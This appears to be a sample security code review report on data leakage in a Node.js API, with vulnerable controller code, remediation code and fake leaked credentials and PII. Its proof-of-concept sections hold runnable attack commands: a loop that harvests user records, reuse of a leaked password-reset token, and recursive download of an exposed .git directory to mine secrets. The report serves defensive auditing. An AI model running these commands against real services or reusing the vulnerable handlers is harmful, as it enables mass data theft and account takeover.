# Security Code Review Report

## Target Information
- **Domain**: api.example.com
- **Review Date**: 2024-10-30
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/api-service
- **Commit Hash**: 6c9e3a2f7d4b8e1a5c9f2d6b4e7a3d8f6b9c5e2a

---

## Executive Summary

This report identifies multiple critical data leakage vulnerabilities in the API service at api.example.com. The application exposes sensitive information through overly verbose error messages, debug endpoints, insecure API responses, and  publicly accessible configuration files. These vulnerabilities collectively expose customer PII, authentication credentials, internal system architecture, and business logic.

---

## Vulnerability Details

### 1. Excessive Data Exposure in API Responses

**Severity**: HIGH
**CWE**: CWE-200 (Exposure of Sensitive Information), CWE-213 (Exposure of Sensitive Information Due to Incompatible Policies)
**CVSS Score**: 7.5
**File**: `api/controllers/userController.js:45`
**Git Commit**: 6c9e3a2f7d4b8e1a5c9f2d6b4e7a3d8f6b9c5e2a

#### Description
The user API endpoints return entire database objects including sensitive fields such as password hashes, internal IDs, security questions, reset tokens, and system metadata. This information is exposed to both authenticated and unauthenticated users.

#### Vulnerable Code
```javascript
// api/controllers/userController.js

const User = require('../models/User');

// VULNERABLE: Returns all user fields including sensitive data
exports.getUserProfile = async (req, res) => {
    try {
        const user = await User.findById(req.params.userId);

        // CRITICAL: Returning entire user object
        return res.json(user);
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
};

// VULNERABLE: Search endpoint leaks user data
exports.searchUsers = async (req, res) => {
    try {
        const { query } = req.query;
        const users = await User.find({
            $or: [
                { username: new RegExp(query, 'i') },
                { email: new RegExp(query, 'i') }
            ]
        }).limit(50);

        // Returns full user objects with sensitive data
        return res.json({ users });
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
};
```

#### Proof of Concept

**1. Enumerate User Data:**
```bash
# Get any user's full profile
curl https://api.example.com/api/users/12345

# Response exposes sensitive data:
{
  "_id": "12345",
  "username": "john.doe",
  "email": "john.doe@example.com",
  "password": "$2b$10$rBVjHX8UyHpKL...",  // Password hash
  "passwordResetToken": "abc123xyz789",
  "passwordResetExpires": "2024-11-01T10:00:00Z",
  "twoFactorSecret": "JBSWY3DPEHPK3PXP",
  "securityQuestion": "What is your mother's maiden name?",
  "securityAnswer": "Smith",
  "ssn": "123-45-6789",
  "dateOfBirth": "1990-01-01",
  "phoneNumber": "+1-555-0123",
  "address": {
    "street": "123 Main St",
    "city": "Springfield",
    "zipCode": "12345"
  },
  "ipAddress": "192.168.1.100",
  "lastLoginAt": "2024-10-29T15:30:00Z",
  "failedLoginAttempts": 2,
  "accountLocked": false,
  "role": "user",
  "permissions": ["read", "write"],
  "apiKeys": ["sk_live_abc123...", "sk_test_xyz789..."],
  "paymentMethods": [{
    "cardNumber": "4111111111111111",
    "cvv": "123",
    "expiryDate": "12/25"
  }],
  "createdAt": "2023-01-15T10:00:00Z",
  "updatedAt": "2024-10-29T15:30:00Z"
}
```

**2. Mass Data Enumeration:**
```bash
# Enumerate all user IDs
for id in {1..10000}; do
  curl -s "https://api.example.com/api/users/${id}" >> user_data.json
done

# Extract sensitive data
cat user_data.json | jq '.email, .phoneNumber, .ssn, .apiKeys' > leaked_data.txt
```

**3. Search Function Data Leakage:**
```bash
# Search for users and get sensitive data
curl "https://api.example.com/api/users/search?query=@example.com"

# Returns all users with their full profiles including:
# - Password hashes
# - Reset tokens
# - 2FA secrets
# - PII data
```

**4. Extract Password Reset Tokens:**
```bash
# Enumerate users and find active reset tokens
curl https://api.example.com/api/users/12345 | jq '.passwordResetToken'

# Use stolen reset token
curl -X POST https://api.example.com/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "token": "abc123xyz789",
    "newPassword": "HackedPassword123!"
  }'
```

#### Impact
- **Mass PII Exposure**: SSN, DOB, addresses, phone numbers
- **Account Takeover**: Via exposed reset tokens and 2FA secrets
- **Financial Fraud**: Exposed payment card data
- **Identity Theft**: Complete user profiles available
- **API Key Theft**: Access to user's API credentials
- **Privacy Violations**: GDPR, CCPA, HIPAA violations
- **Password Cracking**: Exposed password hashes
- **Business Intelligence Leak**: User behavior patterns, IP addresses

---

### 2. Debug Endpoint Exposing System Information

**Severity**: CRITICAL
**CWE**: CWE-215 (Insertion of Sensitive Information Into Debugging Code)
**CVSS Score**: 8.6
**File**: `api/routes/debug.js:12`

#### Vulnerable Code
```javascript
// api/routes/debug.js

// CRITICAL: Debug endpoint left in production
router.get('/api/debug/info', (req, res) => {
    res.json({
        environment: process.env,  // Exposes ALL environment variables
        config: require('../config/database'),
        dbConnection: mongoose.connection.db.serverConfig,
        systemInfo: {
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus(),
            totalMemory: os.totalmem(),
            freeMemory: os.freemem(),
            uptime: os.uptime()
        },
        appInfo: {
            nodeVersion: process.version,
            pid: process.pid,
            execPath: process.execPath,
            cwd: process.cwd(),
            argv: process.argv
        }
    });
});

router.get('/api/debug/routes', (req, res) => {
    // Exposes all API endpoints
    const routes = [];
    app._router.stack.forEach(middleware => {
        if (middleware.route) {
            routes.push({
                path: middleware.route.path,
                methods: Object.keys(middleware.route.methods)
            });
        }
    });
    res.json({ routes });
});
```

#### Proof of Concept
```bash
# Get all environment variables including secrets
curl https://api.example.com/api/debug/info

# Response contains:
{
  "environment": {
    "NODE_ENV": "production",
    "DATABASE_URL": "mongodb://admin:SuperSecret123@db.internal:27017/production",
    "JWT_SECRET": "my-super-secret-jwt-key-12345",
    "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
    "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "STRIPE_SECRET_KEY": "sk_live_51abc123...",
    "SMTP_PASSWORD": "email_password_123",
    "REDIS_PASSWORD": "redis_pass_789",
    "ENCRYPTION_KEY": "aes-256-key-here"
  },
  "config": {
    "host": "db.internal",
    "port": 27017,
    "username": "admin",
    "password": "SuperSecret123",
    "database": "production"
  }
  // ... more sensitive data
}
```

---

### 3. Verbose Error Messages Leaking Stack Traces

**Severity**: MEDIUM
**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)
**File**: `api/middleware/errorHandler.js:8`

#### Vulnerable Code
```javascript
// api/middleware/errorHandler.js

app.use((err, req, res, next) => {
    // VULNERABLE: Exposing full error details
    res.status(err.status || 500).json({
        error: {
            message: err.message,
            stack: err.stack,  // Exposes file paths and code structure
            query: req.query,
            body: req.body,
            headers: req.headers,
            user: req.user  // May expose session data
        }
    });
});
```

#### Proof of Concept
```bash
# Trigger error to get stack trace
curl "https://api.example.com/api/users/invalid-id"

# Response:
{
  "error": {
    "message": "Cast to ObjectId failed for value \"invalid-id\"",
    "stack": "Error: Cast to ObjectId failed\n at /var/www/api/node_modules/mongoose/lib/cast.js:245:11\n at /var/www/api/controllers/userController.js:45:23\n...",
    "query": {"debug": "true"},
    "headers": {"authorization": "Bearer eyJhbGci..."},
    "user": {
      "id": "12345",
      "role": "admin",
      "permissions": [...]
    }
  }
}
```

**Information Leaked:**
- Full file system paths
- Framework and library versions
- Database structure and queries
- Session tokens in headers
- Internal application architecture

---

### 4. Git Repository Exposed

**Severity**: HIGH
**CWE**: CWE-540 (Inclusion of Sensitive Information in Source Code)
**File**: `.git/` directory accessible

#### Proof of Concept
```bash
# Download .git directory
wget -r https://api.example.com/.git/

# Extract secrets from git history
git log --all --full-history --source -- '*password*' '*secret*' '*key*' '*.env*'

# Find database credentials in commits
git grep -i 'password\|secret\|api_key' $(git rev-list --all)

# Recover deleted files containing secrets
git log --diff-filter=D --summary | grep delete
```

**Exposed Information:**
- Database credentials in old commits
- API keys and secrets
- Internal comments and TODOs
- Developer names and emails
- Complete source code history

---

## Remediation

**1. Sanitize API Responses:**

```javascript
// api/controllers/userController.js - SECURE VERSION

const User = require('../models/User');

exports.getUserProfile = async (req, res) => {
    try {
        const user = await User.findById(req.params.userId);

        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }

        // SECURE: Return only safe, necessary fields
        const safeUserData = {
            id: user._id,
            username: user.username,
            displayName: user.displayName,
            avatar: user.avatar,
            bio: user.bio,
            createdAt: user.createdAt
            // NO sensitive fields
        };

        return res.json(safeUserData);
    } catch (error) {
        // Don't expose internal errors
        return res.status(500).json({ error: 'An error occurred' });
    }
};

// Use Mongoose select to exclude fields
exports.searchUsers = async (req, res) => {
    try {
        const { query } = req.query;

        const users = await User.find({
            username: new RegExp(query, 'i')
        })
        .select('username displayName avatar')  // Only safe fields
        .limit(50);

        return res.json({ users });
    } catch (error) {
        return res.status(500).json({ error: 'An error occurred' });
    }
};
```

**2. Secure User Model:**

```javascript
// models/User.js - SECURE VERSION

const userSchema = new Schema({
    username: String,
    email: String,
    password: String,
    ssn: String,
    // ... other fields
});

// Automatically remove sensitive fields from JSON
userSchema.methods.toJSON = function() {
    const user = this.toObject();

    // Remove sensitive fields
    delete user.password;
    delete user.passwordResetToken;
    delete user.twoFactorSecret;
    delete user.securityAnswer;
    delete user.ssn;
    delete user.apiKeys;
    delete user.paymentMethods;
    delete user.ipAddress;

    return user;
};

// Create virtual for safe user data
userSchema.virtual('safeProfile').get(function() {
    return {
        id: this._id,
        username: this.username,
        displayName: this.displayName,
        avatar: this.avatar
    };
});
```

**3. Remove Debug Endpoints:**

```javascript
// config/routes.js - SECURE

// NEVER include debug routes in production
if (process.env.NODE_ENV !== 'production') {
    app.use('/api/debug', require('./routes/debug'));
}

// Or better: Remove debug routes entirely
// Delete api/routes/debug.js
```

**4. Secure Error Handling:**

```javascript
// middleware/errorHandler.js - SECURE

app.use((err, req, res, next) => {
    // Log full error internally
    logger.error({
        message: err.message,
        stack: err.stack,
        url: req.url,
        method: req.method,
        ip: req.ip,
        userId: req.user?.id
    });

    // Return generic error to client
    const statusCode = err.status || 500;
    const response = {
        error: 'An error occurred'
    };

    // In development, include more details
    if (process.env.NODE_ENV === 'development') {
        response.message = err.message;
        response.stack = err.stack;
    }

    res.status(statusCode).json(response);
});
```

**5. Secure Configuration:**

```apache
# .htaccess or nginx config - Block sensitive files

# Block .git directory
<DirectoryMatch "^/.*/\.git/">
    Order deny,allow
    Deny from all
</DirectoryMatch>

# Block environment files
<FilesMatch "^\.env">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block config files
<FilesMatch "\.(yml|yaml|ini|conf|config)$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

---

## Recommendations

1. **Immediate Actions** (within 24 hours):
   - Remove /api/debug endpoints immediately
   - Block access to .git directory
   - Implement response sanitization
   - Rotate all exposed credentials (DB, API keys, JWT secrets)
   - Review logs for data exfiltration
   - Notify affected users if PII was exposed

2. **Short-term Actions** (within 1 week):
   - Implement proper error handling
   - Audit all API endpoints for data leakage
   - Add automated tests for sensitive data exposure
   - Implement API response schemas
   - Add security headers
   - Conduct security training for developers

3. **Long-term Improvements**:
   - Implement Data Loss Prevention (DLP)
   - Regular security audits and penetration testing
   - Automated secret scanning in CI/CD
   - Implement API gateway with response filtering
   - Security monitoring and alerting
   - GDPR/CCPA compliance review

---

## Detection Methods

**Scan for exposed secrets in responses:**
```bash
# Check for common patterns
curl -s https://api.example.com/api/users/123 | \
  grep -E "password|secret|token|apiKey|ssn|creditCard"

# Automated scanning
nuclei -u https://api.example.com -t exposed-panels/
```

**Monitor for debug endpoint access:**
```bash
# Check access logs
grep "/debug" /var/log/nginx/access.log
grep "\.git" /var/log/nginx/access.log
```

---

## Compliance Impact

- **GDPR**: Unauthorized PII disclosure - fines up to €20M
- **CCPA**: Consumer data breach - fines up to $7,500 per violation
- **PCI DSS**: Payment card data exposure - loss of payment processing
- **HIPAA**: PHI disclosure - fines up to $1.5M per violation

---

## Timeline
- **Discovery**: 2024-10-28
- **Verification**: 2024-10-29
- **Report Delivered**: 2024-10-30
- **Expected Fix**: IMMEDIATE (within 24 hours)

---

## References
- OWASP Sensitive Data Exposure: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
- CWE-209: https://cwe.mitre.org/data/definitions/209.html
- OWASP API Security: https://owasp.org/www-project-api-security/
- GDPR Requirements: https://gdpr.eu/
